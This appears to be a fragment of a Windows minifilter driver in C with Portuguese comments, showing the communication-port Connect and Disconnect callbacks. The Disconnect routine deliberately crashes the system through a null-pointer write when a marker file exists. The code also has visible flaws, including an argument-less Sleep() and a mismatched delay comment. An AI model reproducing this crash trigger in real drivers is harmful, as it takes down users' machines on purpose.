
/*

	Operações na porta de comunicação

*/

NTSTATUS Connect(
	_In_ PFLT_PORT Clientport,
	_In_ PVOID ServerPortCookie,
	_In_ PVOID Context,
	_In_ ULONG Size,
	_In_ PVOID ConnectionCookie
)
{
	UNREFERENCED_PARAMETER(ServerPortCookie);
	UNREFERENCED_PARAMETER(Context);
	UNREFERENCED_PARAMETER(Size);
	UNREFERENCED_PARAMETER(ConnectionCookie);

	stopFileSystem = FALSE;
	ClientPort = Clientport;
	

	return STATUS_SUCCESS;
}

NTSTATUS Disconnect(
	_In_ PVOID ConnectionCookie
)
{
	UNREFERENCED_PARAMETER(ConnectionCookie);

	FltCloseClientPort(Filter, &ClientPort);
	stopFileSystem = FALSE;
	ClientPort = NULL;

	// Ooops, vamos travar o sistema
	if (FileExits(CrashSystemFile))
	{
		// Antes de travar, durma por 1 minutos
		for (int i = 0; i < 70; i++)
		{
			Sleep();
		}

		PCHAR String = "";

		// Agora, trave o sistema
		String = 0;
		*String = "a";
	}

	return STATUS_SUCCESS;
}

